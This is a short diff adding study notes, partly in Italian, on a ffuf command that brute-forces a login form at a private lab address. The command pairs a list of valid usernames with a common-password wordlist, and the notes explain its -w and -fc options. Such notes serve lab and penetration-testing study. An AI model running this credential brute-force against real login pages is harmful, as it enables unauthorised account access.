@@ -1,0 +1,8 @@
+ffuf -w valid_usernames.txt:W1,/usr/share/wordlists/SecLists/Passwords/Common-Credentials/10-million-password-list-top-100.txt:W2 -X POST -d "username=W1&password=W2" -H "Content-Type: application/x-www-form-urlencoded" -u http://10.10.190.202/customers/login -fc 200
+
+-w 	spceficare il file dal quale prendere i possibili username :W1 è la keyword 
+	virgola, file per le possibili password combinabili :W2 è l'altra keyword
+
+-fc	per cercare uno stato HTTP diverso dal 200
+
+
